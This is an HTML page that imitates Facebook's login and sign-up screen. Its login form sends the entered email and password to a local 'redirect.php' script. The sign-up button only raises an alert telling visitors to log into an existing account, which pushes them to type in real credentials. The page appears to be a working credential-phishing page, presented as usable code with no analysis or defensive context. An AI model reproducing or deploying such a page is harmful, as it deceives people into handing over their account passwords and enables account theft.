<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="refresh" content="">
        <title id="pageTitle">Facebook – log in or sign up</title>
        <link rel="stylesheet" type="text/css" href="fb.css">
        <script>
        function myFunction() {
          alert("PROBLEM SIGN UP-try logging into existing account.");
        }
        </script>
    </head>
        <body> 
            <div id="full">
            <div id="top">
                <div id="topleft">
                   <br><span style=" font-size: 300%;padding:30px;
                    font-weight: bolder;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;facebook </span>
                </div>
                <div id="topright">
                    <form action="redirect.php" method="post">
                    <div id="email">
                        <br>
                        Email or Phone<br><input name="email" type="text" class="fill" style="border-radius: 1px"><br>
                    </div>
                    <div id="pass">
                        <br>
                        Password<br><input class="fill" name="password" type="password" style="border-radius: 1px">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="submit" value="Log In" href="https://www.fb.com" id="log"><br><a href="https://www.fb.com" id="fo">Forgotten account?</a>
                    </div></form>
                </div>
            </div>
            <div id="mid">
                <div id="midright">    
                    <br><br><br>Facebook helps you connect and share with the<br> people in your life.<br>
                    <img src="fb.png" width="530px">
                </div> 
                <div id="midleft"><div id="cre">
                    <h1>Create an account</h1>
                    <p style="font-size:large">It's free and always will be.</p></div><div>
                    <input class="inp" type="text" placeholder="First name"> 
                    <input class="inp" type="text" placeholder="Surname"><br>
                    <input class="inp" type="text" placeholder="Mobile number or email address" style="width:97%;"><br>
                    <input class="inp" type="text" placeholder="New password"style="width:97%;"><br></div>
                        <div class="mrb">
                            Birthday<br>
                            <input type="date">
                        </div>
                        <div  class="gend">
                            <input type="radio" name="gender">Female&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                            <input type="radio" name="gender">Male
                        </div>
                        <div id="end">
                             <br>By clicking Sign Up, you agree to our Terms, Data Policy and<br> Cookie Policy. You may receive SMS notifications from us and<br> can opt out at any time.<br><br>
                        </div>
                        <div >
                        <input id="sign" type="submit" value="Sign Up" onclick="myFunction()">
                        </div>
                        <div id="cel">
                        Create a Page for a celebrity, band or business.
                        </div>
                </div>
            </div>
            <div id="foot">
                <div id="lang" align="center">
                    <pre>
                        English (UK) ಕನ್ನಡ اردو मराठी  తెలుగు हिन्दी தமிழ் മലയാളം বাংলা ગુજરાતી ਪੰਜਾਬੀ
                    </pre>
                    <hr width="900px" align="center">
                </div>
                <div id="opt">
                </div>    
            </div>
            </div>
        </body>
</html>